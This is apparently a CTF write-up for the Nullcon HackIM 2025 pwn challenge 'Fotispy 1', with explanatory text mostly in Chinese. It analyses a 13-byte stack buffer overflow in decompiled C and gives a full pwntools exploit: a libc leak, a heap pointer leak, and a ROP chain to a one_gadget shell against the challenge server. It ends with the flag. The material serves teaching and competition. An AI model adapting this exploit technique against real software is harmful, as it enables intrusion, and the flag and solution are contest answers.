---
title: "Write-ups: Nullcon Berlin HackIM 2025 CTF"
published: 2025-09-07
updated: 2025-09-07
description: "Write-ups for Nullcon Berlin HackIM 2025 CTF pwn aspect."
tags: ["Pwn", "Write-ups"]
category: "Write-ups"
draft: false
---

# Fotispy 1

## Information

- Category: Pwn
- Points: 500

## Description

> Spotify with a GUI? A true hacker only needs the terminal.
> Note: Despite the naming, these 7 challenges can be solved in any order and do not depend on each other.

## Write-up

经过分析，得到程序用的结构体大致是这样的：

```c
00000000 struct Userdata // sizeof=0x18
00000000 {
00000000     char *username;
00000008     char *password;
00000010     struct Favorite *favorites;
00000018 };

00000000 struct Favourite // sizeof=0x10
00000000 {
00000000     struct Favourite *next;
00000008     struct Song *song;
00000010 };

00000000 struct Song // sizeof=0x30
00000000 {
00000000     char *title;
00000008     int title_len;
0000000C     // padding byte
0000000D     // padding byte
0000000E     // padding byte
0000000F     // padding byte
00000010     char *album;
00000018     int album_len;
0000001C     // padding byte
0000001D     // padding byte
0000001E     // padding byte
0000001F     // padding byte
00000020     char *from;
00000028     int from_len;
0000002C     // padding byte
0000002D     // padding byte
0000002E     // padding byte
0000002F     // padding byte
00000030 };
```

发现 memcpy 会复制定长数据到 dest，但是 dest 只有 13 字节，怀疑可能有 BOF。运行程序测试了一下，确实崩溃了。

:::tip
这里后期还得通过 display 函数泄漏 favourite 结构体的地址，因为我们不想执行第二次 while 循环，而覆盖返回地址一定会破坏原先的 favourite 结构体地址。
:::

```c del={4, 22}
int display_fav()
{
  struct Favourite *v0; // rax
  char dest[13]; // [rsp+Bh] [rbp-15h] BYREF
  Favourite *favorites; // [rsp+18h] [rbp-8h]

  if ( login_idx == -1 )
  {
    LODWORD(v0) = puts("[-] No user has logged in yet.");
  }
  else
  {
    favorites = (Favourite *)users[(unsigned __int8)login_idx]->favorites;
    memset(dest, 0, sizeof(dest));
    LODWORD(v0) = puts("[~] Your favorites:");
    while ( favorites )
    {
      memcpy(dest, favorites->song->title, (unsigned int)favorites->song->title_len);
      printf("    - Song: %s", dest);
      memcpy(dest, favorites->song->album, (unsigned int)favorites->song->album_len);
      printf(" - %s", dest);
      memcpy(dest, favorites->song->from, (unsigned int)favorites->song->from_len);
      printf(" - %s\n", dest);
      v0 = favorites->next;
      favorites = favorites->next;
    }
  }
  return (int)v0;
}
```

继续分析，发现 `add_song` 会读取 256 字节数据，并设置对应数据的长度为 256。那配合上面的 `display_fav`，就完全可以 BOF 打 ROP 了。

```c del={22, 24, 26, 28}
int add_song()
{
  struct Userdata *v0; // rax
  struct Favorite *v2; // [rsp+8h] [rbp-38h]
  struct Song *song; // [rsp+10h] [rbp-30h]
  int from_len; // [rsp+1Ch] [rbp-24h]
  int album_len; // [rsp+20h] [rbp-20h]
  int title_len; // [rsp+24h] [rbp-1Ch]
  char *album; // [rsp+28h] [rbp-18h]
  char *from; // [rsp+30h] [rbp-10h]
  char *title; // [rsp+38h] [rbp-8h]

  if ( login_idx == -1 )
  {
    LODWORD(v0) = puts("[-] No user has logged in yet.");
  }
  else
  {
    title = (char *)calloc(256uLL, 1uLL);
    from = (char *)calloc(256uLL, 1uLL);
    album = (char *)calloc(256uLL, 1uLL);
    printf("[DEBUG] %p\n", &printf);
    printf("[~] Please enter a song title: ");
    title_len = readn((__int64)title, 256LL);
    printf("[~] Please enter a who %s is from: ", title);
    album_len = readn((__int64)album, 256LL);
    printf("[~] Please enter which album %s is on: ", title);
    from_len = readn((__int64)from, 256LL);
    song = (struct Song *)calloc(48uLL, 1uLL);
    song->from = from;
    song->from_len = from_len;
    song->title = title;
    song->title_len = title_len;
    song->album = album;
    song->album_len = album_len;
    v2 = (struct Favorite *)calloc(16uLL, 1uLL);
    *((_QWORD *)v2 + 1) = song;
    *(_QWORD *)v2 = users[(unsigned __int8)login_idx]->favorites;
    v0 = users[(unsigned __int8)login_idx];
    v0->favorites = v2;
  }
  return (int)v0;
}
```

## Exploit

```python
#!/usr/bin/env python3

from pwn import (
    ELF,
    args,
    context,
    flat,
    process,
    remote,
    u64,
)

FILE = "./fotispy1"
HOST, PORT = "52.59.124.14", 5191

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary
libc = ELF("./libc.so.6")


def register(target, username, password):
    target.sendlineafter(b"Please enter your choice [E]: ", b"0")
    target.sendlineafter(b"username: ", username)
    target.sendlineafter(b"password: ", password)


def login(target, username, password):
    target.sendlineafter(b"Please enter your choice [E]: ", b"1")
    target.sendlineafter(b"username: ", username)
    target.sendlineafter(b"password: ", password)


def leak(target):
    target.recvuntil(b"[DEBUG] ")
    return int(target.recvline().strip(), 16)


def add(target, song_title, song_from, song_on):
    target.sendlineafter(b"Please enter your choice [E]: ", b"2")
    printf_addr = leak(target)

    target.sendlineafter(b"title: ", song_title)
    target.sendlineafter(b"from: ", song_from)
    target.sendlineafter(b"on: ", song_on)
    return printf_addr


def display(target):
    target.sendlineafter(b"Please enter your choice [E]: ", b"3")


def launch():
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)
    return target


def main():
    target = launch()

    register(target, b"admin", b"admin")
    login(target, b"admin", b"admin")
    printf_addr = add(target, b"a", b"a", b"a")
    libc.address = printf_addr - libc.sym["printf"]

    payload = b"A" * 0xD
    add(target, b"a", b"a", payload)
    display(target)

    target.recvuntil(b"\x0a")
    target.recvuntil(b"\x0a")
    favourite_addr = u64(target.recvuntil(b"\x0a").strip()[-4:].ljust(0x8, b"\x00"))

    pop_rdi = libc.address + 0x00000000000277E5
    one_gadget = libc.address + 0xD515F
    payload = flat(
        b"A" * 0xD,
        favourite_addr,
        elf.bss(),
        pop_rdi,
        0x0,
        one_gadget,
    )
    add(target, b"a", b"a", payload)
    display(target)

    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

:spoiler[`ENO{3v3ry_r0p_ch41n_st4rts_s0m3wh3r3}`]
